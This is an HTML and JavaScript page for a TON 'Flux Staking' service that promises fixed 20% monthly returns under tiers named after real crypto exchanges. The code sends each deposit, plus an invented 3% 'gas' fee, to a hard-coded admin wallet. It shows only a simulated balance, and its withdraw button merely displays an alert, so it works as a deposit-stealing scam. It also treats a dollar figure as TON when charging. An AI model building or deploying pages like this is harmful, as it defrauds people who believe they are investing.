<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flux Staking</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        body { background-color: #050508; color: white; font-family: sans-serif; -webkit-tap-highlight-color: transparent; }
        .glass { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.08); }
        .modal-bg { background: rgba(0, 0, 0, 0.9); backdrop-filter: blur(10px); }
    </style>
</head>
<body>
    <div id="app" class="max-w-md mx-auto min-h-screen pb-24 relative">
        <div class="flex justify-between items-center p-6 sticky top-0 bg-[#050508]/80 backdrop-blur-md z-40">
            <div class="font-black text-indigo-500 tracking-tighter">FLUX</div>
            <div id="ton-connect-button"></div>
        </div>

        <div class="text-center py-6">
            <p class="text-gray-500 text-[10px] uppercase tracking-widest font-bold">Available Balance</p>
            <h1 id="user-balance" class="text-4xl font-bold my-1">$0.00</h1>
            <button onclick="openWithdraw()" class="text-indigo-400 text-xs font-bold bg-indigo-500/10 px-4 py-1 rounded-full mt-2 border border-indigo-500/20">Withdraw Funds</button>
        </div>

        <div class="px-6 space-y-3" id="tier-list">
            <p class="text-gray-600 text-[10px] font-bold uppercase ml-1">Staking Plans (20% Monthly)</p>
            </div>

        <div id="staking-modal" class="fixed inset-0 z-50 modal-bg hidden flex items-end">
            <div class="w-full bg-[#11111a] rounded-t-3xl p-8 border-t border-white/10 animate-slide-up">
                <h2 id="modal-title" class="text-xl font-bold mb-6">Confirm Stake</h2>
                
                <div class="space-y-4 mb-8">
                    <div class="flex justify-between items-center glass p-4 rounded-xl">
                        <span class="text-gray-400 text-sm">Staking Amount</span>
                        <span id="modal-amount" class="font-bold text-lg text-white">$0.00</span>
                    </div>
                    <div class="flex justify-between items-center glass p-4 rounded-xl border-dashed border-indigo-500/30">
                        <span class="text-gray-400 text-sm">Network Gas (3%)</span>
                        <span id="modal-gas" class="font-bold text-indigo-400">$0.00</span>
                    </div>
                </div>

                <button onclick="confirmTransaction()" class="w-full bg-indigo-600 py-4 rounded-2xl font-black text-sm uppercase tracking-widest shadow-lg shadow-indigo-600/20">Confirm & Activate</button>
                <button onclick="closeModal()" class="w-full mt-4 text-gray-500 text-sm font-bold">Cancel</button>
            </div>
        </div>
    </div>

    <script>
        const ADMIN_WALLET = "UQCcMrZZkHhi0rpjh_LL3E4AiTXICYTuBcqRpcJ-KKEt8bO1";
        let selectedTier = null;

        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://squardzbrain20.github.io/flux-staking/tonconnect-manifest.json',
            buttonRootId: 'ton-connect-button'
        });

        const TIERS = [
            { name: 'Binance', min: 10, color: '#F3BA2F' },
            { name: 'Bitget', min: 100, color: '#00F0FF' },
            { name: 'OKX', min: 500, color: '#FFFFFF' },
            { name: 'MEXC', min: 2500, color: '#0052FF' },
            { name: 'KuCoin', min: 10000, color: '#24AE8F' }
        ];

        function renderTiers() {
            const list = document.getElementById('tier-list');
            TIERS.forEach(tier => {
                const div = document.createElement('div');
                div.className = 'glass p-5 rounded-2xl flex justify-between items-center cursor-pointer active:scale-95 transition-all';
                div.innerHTML = `
                    <div class="flex items-center gap-4">
                        <div class="w-10 h-10 rounded-full flex items-center justify-center border-2 font-black text-xs" style="border-color: ${tier.color}40; color: ${tier.color}">${tier.name[0]}</div>
                        <div>
                            <div class="font-bold text-sm text-white">${tier.name}</div>
                            <div class="text-[10px] text-gray-500 uppercase font-bold tracking-tighter">Min Deposit: $${tier.min.toLocaleString()}</div>
                        </div>
                    </div>
                    <div class="text-right">
                        <div class="text-green-400 font-black">20%</div>
                        <div class="text-[8px] text-gray-600 uppercase font-bold">Fixed PnL</div>
                    </div>
                `;
                div.onclick = () => openModal(tier);
                list.appendChild(div);
            });
        }

        function openModal(tier) {
            selectedTier = tier;
            const gas = tier.min * 0.03;
            document.getElementById('modal-title').innerText = `${tier.name} Staking`;
            document.getElementById('modal-amount').innerText = `$${tier.min.toLocaleString()}`;
            document.getElementById('modal-gas').innerText = `$${gas.toFixed(2)}`;
            document.getElementById('staking-modal').classList.remove('hidden');
        }

        function closeModal() {
            document.getElementById('staking-modal').classList.add('hidden');
        }

        async function confirmTransaction() {
            if (!tonConnectUI.connected) return alert("Please connect wallet!");
            
            const gasFee = selectedTier.min * 0.03;
            const total = (selectedTier.min + gasFee);
            
            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 360,
                messages: [{
                    address: ADMIN_WALLET,
                    amount: (total * 1000000000).toString(), // To NanoTON
                    payload: "" // Optional: Add "Tier: "+selectedTier.name base64 encoded
                }]
            };

            try {
                const result = await tonConnectUI.sendTransaction(transaction);
                if (result) {
                    closeModal();
                    alert("Transaction sent! Your 30-day countdown is now active.");
                    // Update UI balance (simulation)
                    document.getElementById('user-balance').innerText = `$${selectedTier.min.toLocaleString()}`;
                }
            } catch (e) {
                console.error(e);
                alert("Transaction failed or cancelled.");
            }
        }

        function openWithdraw() {
            const currentBal = document.getElementById('user-balance').innerText;
            if (currentBal === "$0.00") return alert("No funds available for withdrawal.");
            alert("Withdrawal request sent to processing.");
        }

        renderTiers();
    </script>
</body>
</html>
